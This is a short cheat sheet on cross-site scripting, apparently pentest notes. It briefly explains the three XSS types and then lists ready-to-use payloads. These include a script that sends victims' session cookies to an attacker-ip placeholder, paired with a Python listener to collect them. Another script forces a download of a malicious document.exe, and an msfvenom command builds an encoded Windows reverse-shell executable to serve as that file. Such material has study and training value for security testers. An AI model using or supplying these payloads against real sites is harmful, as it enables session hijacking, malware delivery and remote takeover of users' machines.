Vulnerability that allows the attacker to compromise the interaction between a user and the web application

There are three main types of XSS attacks. These are:

- Reflected XSS, where the malicious script comes from the current HTTP request.
- Stored XSS, where the malicious script comes from the website's database.
DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
# Payloads
## Simple
    <script>alert('XSS')</script>

## Cookie forwarding
    <script>document.write('<img src="http://<attacker-ip>:<listening-port>/?'+document.cookie+'" />');</script>

### Listening with python http server
    python3 -m http.server <listening-port>

Will allow to get the session cookies of users

## Malware download

    <script>var link = document.createElement('a');
    link.href = 'http://<attacker-ip>/document.exe'; // document.exe is the malware
    link.download = '';
    document.body.appendChild(link);
    link.click();</script>

Create a shell reversal with `msfvenom`

    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker listening port> EXITFUNC=thread -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > /var/www/html/document.exe